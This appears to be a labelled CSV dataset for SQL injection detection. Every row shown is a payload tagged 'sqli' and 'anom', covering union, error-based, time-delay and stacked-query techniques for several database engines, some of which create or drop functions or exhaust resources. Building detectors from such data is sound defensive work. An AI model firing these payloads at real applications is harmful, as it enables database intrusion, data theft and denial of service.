Query,Length,Attack,Label
"1' where 6406=6406;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",115,sqli,anom
"1) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (4666=4666",111,sqli,anom
-3136%') or 3400=6002,21,sqli,anom
1) where 7956=7956 or sleep(5)#,31,sqli,anom
-7387'))) order by 1--,22,sqli,anom
1')) as gfzb where 7904=7904;begin dbms_lock.sleep(5); end--,60,sqli,anom
"1))) union all select null,null,null#",37,sqli,anom
"-5622"" where 7970=7970 union all select 7970,7970,7970,7970,7970--",66,sqli,anom
"1"")) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((""smnw"" like ""smnw",227,sqli,anom
"-9860%"" union all select 6996,6996,6996,6996,6996,6996#",55,sqli,anom
"1));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ((7240=7240",101,sqli,anom
-2604)) as sekb where 6897=6897 or 1000=7683,44,sqli,anom
"1%""))) waitfor delay '0:0:5'--",30,sqli,anom
"1"") as nraw where 7984=7984 and elt(3114=3114,sleep(5))#",56,sqli,anom
1');begin dbms_lock.sleep(5); end and ('jzlr'='jzlr,51,sqli,anom
"1%"");select benchmark(5000000,md5(0x714e4153))#",47,sqli,anom
"1'))) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",103,sqli,anom
"1%"")));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (((""%""=""",134,sqli,anom
"-4259')) as usqu where 5419=5419 or elt(8325=8837,8837)--",57,sqli,anom
"1')) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('ijyi'='ijyi",124,sqli,anom
-1638' or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'xkne'='xkne,203,sqli,anom
"-2583"") where 3455=3455 or make_set(9354=9354,7185)--",53,sqli,anom
"-6267""))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""rqws""=""rqws",209,sqli,anom
"1%"";call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",104,sqli,anom
"1%'))) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",69,sqli,anom
"-3885) where 2387=2387 union all select 2387,2387,2387,2387,2387,2387,2387#",75,sqli,anom
1'+(select 'gmpn' where 8137=8137 or sleep(5))+',48,sqli,anom
"-4182)) as wkfh where 6145=6145 union all select 6145,6145,6145,6145,6145#",74,sqli,anom
"1"" union all select null#",25,sqli,anom
"1') as zdhq where 5586=5586;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",88,sqli,anom
1' where 8584=8584 order by 1#,30,sqli,anom
"1') and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",100,sqli,anom
1')) as plbt where 4368=4368 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,262,sqli,anom
1'));select (case when (8601=1220) then 8601 else 8601*(select 8601 from mysql.db) end)#,88,sqli,anom
"1"" or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ""ekjs"" like ""ekjs",115,sqli,anom
"1'||(select 'frrk' from dual where 3145=3145 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)))||'",138,sqli,anom
"1"")) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",66,sqli,anom
"1%"") or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (""%""=""",120,sqli,anom
1 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric),188,sqli,anom
"1""))) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (((""abcw""=""abcw",175,sqli,anom
"1%'));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (('%'='",99,sqli,anom
1'))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('njge' like 'njge,211,sqli,anom
"1') where 7007=7007 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",95,sqli,anom
"1""))) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (((""gfwz""=""gfwz",181,sqli,anom
"1)) as pjjz where 8384=8384 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",119,sqli,anom
"1%"")) order by 1#",17,sqli,anom
1));select (case when (3855=3855) then 3855 else 1/(select 0) end)--,68,sqli,anom
-6165%')) union all select 5384#,32,sqli,anom
"1);select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",93,sqli,anom
"1) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",111,sqli,anom
"-2122"") as zytb where 7025=7025 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",235,sqli,anom
"1) as nsdy where 7513=7513;select * from generate_series(3267,3267,case when (3267=5900) then 1 else 0 end) limit 1--",117,sqli,anom
1) as imdt where 6431=6431;begin user_lock.sleep(5); end--,58,sqli,anom
1')) as eltx where 9955=9955 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,217,sqli,anom
1) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (6518=6518,216,sqli,anom
1'||(select 'mosp' where 6085=6085;waitfor delay '0:0:5'--,58,sqli,anom
"1') where 1093=1093 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--",111,sqli,anom
"1%"")));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (((""%""=""",114,sqli,anom
"-6789'||(select 'uckz' from dual where 2163=2163 union all select 2163,2163,2163,2163,2163,2163--",97,sqli,anom
"-6108') union all select 2519,2519,2519,2519--",46,sqli,anom
1) where 3979=3979 rlike sleep(5)--,35,sqli,anom
-8143) union all select 3014--,30,sqli,anom
"-9954"")) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((""bifi""=""bifi",258,sqli,anom
1') where 6624=6624 and 5392=8258,33,sqli,anom
"-3884"" where 8012=8012 union all select 8012,8012#",50,sqli,anom
"1%"" or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ""%""=""",117,sqli,anom
"1%');select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",96,sqli,anom
"1"") where 2834=2834 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",208,sqli,anom
"1) where 9371=9371 union all select null,null,null,null,null,null,null--",72,sqli,anom
"1"" where 7380=7380 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",113,sqli,anom
"1) where 2679=2679 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",113,sqli,anom
"1"") where 2388=2388 union all select null,null,null,null,null,null,null,null,null--",83,sqli,anom
-9336' or 5641=9488#,20,sqli,anom
"-3205"") union all select 5233,5233,5233,5233#",45,sqli,anom
1') rlike (select * from (select(sleep(5)))vwyq)#,49,sqli,anom
"1"") where 7548=7548;select sleep(5)--",37,sqli,anom
1';(select * from (select(sleep(5)))srmq),41,sqli,anom
1'));select case when 2095=9074 then 1 else null end--,54,sqli,anom
"1%"")) rlike (select * from (select(sleep(5)))vwyq)#",51,sqli,anom
1' where 4134=4134 and 1102=6300--,34,sqli,anom
"1')) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (('kmjn'='kmjn",97,sqli,anom
"-5800"") or 6872=6872 and (""tcab"" like ""tcab",43,sqli,anom
"-6599"")) union all select 2870,2870,2870,2870,2870,2870,2870,2870,2870,2870--",77,sqli,anom
"(cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select 1 from generate_series(9815,9815,case when (9815=9815) then 1 else 0 end) limit 1)::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric))",219,sqli,anom
1,2,sqli,anom
"1%""));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",90,sqli,anom
"1') where 3262=3262 union all select null,null,null,null,null,null,null,null,null,null#",87,sqli,anom
"1')(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ('vjnf' like 'vjnf",212,sqli,anom
"1"") and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""hsaw""=""hsaw",82,sqli,anom
1 where 2382=2382;(select * from (select(sleep(5)))acdk)#,57,sqli,anom
"1"") or 8421=(select count(*) from generate_series(1,5000000)) and (""rzja"" like ""rzja",84,sqli,anom
"1%"")) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""%""=""",213,sqli,anom
1'||(select 'puco' where 2605=2605 union all select null#,57,sqli,anom
1%')) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (('%'=',249,sqli,anom
"make_set(5679=9769,9769)",24,sqli,anom
"-2333' union all select 9714,9714,9714--",40,sqli,anom
"1"") where 6843=6843 or 6793=(select 6793 from pg_sleep(5))--",60,sqli,anom
"1' or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and 'yaje'='yaje",123,sqli,anom
1'+(select 'vddk' where 6961=6961;if(4194=4133) select 4194 else drop function tqhz--,85,sqli,anom
"1"" where 5552=5552 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",170,sqli,anom
"-1197"")) as dfsy where 8857=8857 or 3038=3038",45,sqli,anom
"1%')) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('%'='",77,sqli,anom
"1"") as fkco where 8877=8877 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",199,sqli,anom
"1')) union all select null,null,null,null,null--",48,sqli,anom
1%') and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ('%'=',109,sqli,anom
1))) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (((4694=4694,253,sqli,anom
"1"") where 5197=5197 and elt(3114=3114,sleep(5))#",48,sqli,anom
"1'||(select 'aevx' from dual where 9999=9999;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5))||'",163,sqli,anom
1%';select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,112,sqli,anom
"-2518' union all select 6818,6818,6818,6818,6818,6818#",54,sqli,anom
"1%"")) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((""%""=""",120,sqli,anom
"1;select count(*) from generate_series(1,5000000)-- gqkk",56,sqli,anom
"1'||(select 'wqmz' where 6400=6400 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x))||'",240,sqli,anom
-3938%'))) or 2034=7209#,24,sqli,anom
"1%')) union all select null,null,null#",38,sqli,anom
1) where 5866=5866 and 4595=4595#,33,sqli,anom
1'))) or (select * from (select(sleep(5)))ydpu) and ((('jrpk'='jrpk,67,sqli,anom
"1',(select (case when (2106=2106) then (select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) else 2106*(select 2106 from master..sysdatabases) end))",236,sqli,anom
-1629'))) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((('tezf'='tezf,227,sqli,anom
"-7868"" union all select 1805--",30,sqli,anom
1'+(select 'jtvq' where 8288=8288 and (select * from (select(sleep(5)))gcrr)#,77,sqli,anom
1));begin user_lock.sleep(5); end and ((6874=6874,49,sqli,anom
"-8060"") where 5290=5290 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--",118,sqli,anom
"1%"") or elt(5873=5873,sleep(5))#",32,sqli,anom
"1')) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (('zknl'='zknl",98,sqli,anom
"1""))) and 7533=7533 and (((""alvd"" like ""alvd",44,sqli,anom
"1 where 5929=5929 or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",115,sqli,anom
1'));(select * from (select(sleep(5)))acdk)#,44,sqli,anom
"1') as ildf where 5545=5545 union all select null,null,null,null#",65,sqli,anom
 or '1' = '1,13,sqli,anom
-3752%' union all select 9351--,31,sqli,anom
"1"" where 6800=6800 procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",109,sqli,anom
1%');if(7899=7899) select 7899 else drop function zbbp--,56,sqli,anom
1' where 3188=3188 and 9198=9198--,34,sqli,anom
"-4954%"") or 5244=4832",21,sqli,anom
1'))) and 3602=1990#,20,sqli,anom
"-7142')) union all select 5083,5083,5083,5083#",46,sqli,anom
"-9256"")) union all select 2977,2977,2977,2977,2977,2977,2977--",62,sqli,anom
"-9532)) union all select 6039,6039,6039,6039--",46,sqli,anom
1'+(select 'wvqj' where 3709=3709;begin user_lock.sleep(5); end--,65,sqli,anom
"1%"" and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",111,sqli,anom
"1') where 3476=3476 and elt(1210=1210,sleep(5))--",49,sqli,anom
"1')) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (('nuil' like 'nuil",103,sqli,anom
-9100) or 8792=9550--,21,sqli,anom
"-3873%')) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",140,sqli,anom
"1)) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((9270=9270",108,sqli,anom
"1' in boolean mode);select count(*) from generate_series(1,5000000)#",68,sqli,anom
1'))) and (1685=2985)*2985 and ((('rzwb'='rzwb,46,sqli,anom
"-2149""))) or elt(1032=1032,3623) and (((""hoon"" like ""hoon",57,sqli,anom
"-9672')) as rupb where 8218=8218 or make_set(4954=1836,1836)--",62,sqli,anom
"1,(select (case when (3743=9640) then 1 else 3743*(select 3743 from master..sysdatabases) end))",95,sqli,anom
"1%"");call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""%""=""",114,sqli,anom
"1%""))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((""%""=""",124,sqli,anom
"-5008' union all select 1942,1942,1942,1942,1942,1942,1942,1942--",65,sqli,anom
1%' or (select * from (select(sleep(5)))sddo)#,46,sqli,anom
1' and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and 'fdbm' like 'fdbm,223,sqli,anom
1) where 1527=1527 or 4240=(select 4240 from pg_sleep(5))--,59,sqli,anom
"1') and 3824=benchmark(5000000,md5(0x76555642))",47,sqli,anom
"1'+(select yfuu where 1717=1717 union all select null,null,null,null,null,null,null,null,null--",95,sqli,anom
"-3963"" or 1224=5119",19,sqli,anom
1)) as cwyb where 3633=3633;select (case when (3681=5026) then 3681 else 3681*(select 3681 from information_schema.character_sets) end)#,136,sqli,anom
-1354)) or 8571=8571--,22,sqli,anom
"1' where 3612=3612 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",191,sqli,anom
"1"")) as zgig where 5748=5748 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",226,sqli,anom
"1' in boolean mode) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)#",114,sqli,anom
"1'||(select 'yags' where 6268=6268 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3))||'",139,sqli,anom
"1%"" or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",110,sqli,anom
"1%'))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (('%'='",214,sqli,anom
"1) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))",104,sqli,anom
"1))) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",99,sqli,anom
"-7324) or make_set(8486=6544,6544)",34,sqli,anom
"1') as gxpb where 7107=7107 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))--",131,sqli,anom
"1 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)# kkmw",158,sqli,anom
1 and 6969=(select 6969 from pg_sleep(5))-- yczq,48,sqli,anom
"1%""))) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((""%""=""",112,sqli,anom
"1"")) as eagr where 3366=3366 and elt(4249=4249,7259)--",54,sqli,anom
"1"" where 6023=6023;if(1928=4811) select 1928 else drop function ucko--",70,sqli,anom
"1"")) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((""fkip""=""fkip",219,sqli,anom
"1""))) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",68,sqli,anom
"1') and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('qtfl'='qtfl",217,sqli,anom
"1"");create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",120,sqli,anom
"-9606 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))# iuij",206,sqli,anom
"1"";select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",90,sqli,anom
"1 where 9279=9279 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",93,sqli,anom
"1%' or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and '%'='",214,sqli,anom
"1%""));select (case when (1499=4923) then 1499 else 1/(select 0) end)--",70,sqli,anom
"1'))) union all select null,null,null--",39,sqli,anom
"-4319"") where 7534=7534 or 8246=3217",36,sqli,anom
"1) where 9724=9724 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",124,sqli,anom
1'));begin user_lock.sleep(5); end--,36,sqli,anom
"1%' and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and '%'='",215,sqli,anom
"1%') union all select null,null,null,null,null,null--",53,sqli,anom
"-8929%') union all select 9486,9486,9486,9486#",46,sqli,anom
"1') as asjj where 1721=1721 union all select null,null,null,null,null,null--",76,sqli,anom
"-4135"") as leiz where 3582=3582 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--",264,sqli,anom
"1'))) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('xzcr'='xzcr",164,sqli,anom
"-1139) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",137,sqli,anom
"1'))) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('rfln'='rfln",176,sqli,anom
"1') where 4750=4750 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",124,sqli,anom
1))) and 9198=9198--,20,sqli,anom
-4339) where 7178=7178 or 4008=7232,35,sqli,anom
"1')) as ytfi where 3323=3323 and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",91,sqli,anom
1')));select (case when (5768=9169) then 5768 else 1/(select 0) end)--,70,sqli,anom
"1' where 3125=3125 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",207,sqli,anom
"1""))) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and (((""zoag"" like ""zoag",232,sqli,anom
"1'));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('kyos' like 'kyos",87,sqli,anom
"1%"");select pg_sleep(5)--",25,sqli,anom
"1)) as midl where 9046=9046 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",104,sqli,anom
"-9313%"") or 5971=4572#",22,sqli,anom
"-1083%""))) or elt(1032=1032,3623) and (((""%""=""",46,sqli,anom
"-6093') where 9676=9676 union all select 9676,9676,9676,9676,9676,9676--",72,sqli,anom
"-3179'+(select 'tzzz' where 3191=3191 union all select 3191,3191,3191,3191,3191#",80,sqli,anom
"1"");select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (""yxes"" like ""yxes",85,sqli,anom
"1'));call regexp_substring(repeat(right(char(3702),0),500000000),null) and (('frpo' like 'frpo",94,sqli,anom
1' where 9583=9583 and 5319=7670#,33,sqli,anom
"1%"")))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (((""%""=""",205,sqli,anom
"1"")));if(8727=4039) select 8727 else drop function giql--",57,sqli,anom
"1"" and sleep(5)#",16,sqli,anom
"1 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)",102,sqli,anom
"1""))) or elt(5873=5873,sleep(5))#",33,sqli,anom
"1'+(select pdfv where 1172=1172 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161))+'",126,sqli,anom
"1)) or 8514=benchmark(5000000,md5(0x544d5a4c))#",47,sqli,anom
"-3672"")) union all select 6093#",31,sqli,anom
"1%""))) rlike sleep(5) and (((""%""=""",34,sqli,anom
"1' and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'fjfo'='fjfo",158,sqli,anom
"1%')) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (('%'='",167,sqli,anom
"1'))) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ((('gfll'='gfll",155,sqli,anom
"1"")));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",97,sqli,anom
"1')) or 8466=benchmark(5000000,md5(0x694a4745)) and (('ossj'='ossj",66,sqli,anom
"1"") procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",94,sqli,anom
"1"")) and 7656=5604 and ((""zuhv""=""zuhv",37,sqli,anom
"1')) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (('nlnk' like 'nlnk",183,sqli,anom
"1 where 4944=4944 union all select null,null,null,null,null,null,null,null,null#",80,sqli,anom
1%') or sleep(5)#,17,sqli,anom
"1'+(select unzl where 3432=3432 union all select null,null,null,null--",70,sqli,anom
"1,iif(1440=4612,1,1/0)",22,sqli,anom
"-9111"" or 3038=3038",19,sqli,anom
"1%'))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((('%'='",124,sqli,anom
"-7258 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",136,sqli,anom
1)));select case when 7717=7717 then 1 else null end--,54,sqli,anom
"1%'));iif(5257=5257,1,1/0)",26,sqli,anom
"1%""))) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""%""=""",215,sqli,anom
"1%')));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",97,sqli,anom
"1%"";select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",91,sqli,anom
"1 or 8514=benchmark(5000000,md5(0x544d5a4c))#",45,sqli,anom
1') and 7290=8416 and ('ktlz' like 'ktlz,40,sqli,anom
1%' or 4240=(select 4240 from pg_sleep(5))--,44,sqli,anom
"1') or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)",99,sqli,anom
"-7940%"") union all select 2779,2779,2779,2779,2779,2779,2779,2779,2779,2779#",76,sqli,anom
"-1692') union all select 7074,7074,7074,7074,7074,7074,7074#",60,sqli,anom
-5116) or (8287=4930)*4930,26,sqli,anom
"1"")) as ubrg where 7318=7318 and 7331=6529--",44,sqli,anom
"-5539"") union all select 6189,6189,6189,6189,6189,6189,6189,6189,6189--",71,sqli,anom
"1%"")));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (((""%""=""",102,sqli,anom
"1) as hvsk where 7902=7902;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",123,sqli,anom
1') as jlae where 1650=1650;begin user_lock.sleep(5); end--,59,sqli,anom
-3859) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (5846=5846,207,sqli,anom
"1%""))) union all select null,null,null,null,null,null,null,null,null--",70,sqli,anom
"1"" (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)",189,sqli,anom
"1)) as xroy where 3274=3274;iif(3760=4785,1,1/0)",48,sqli,anom
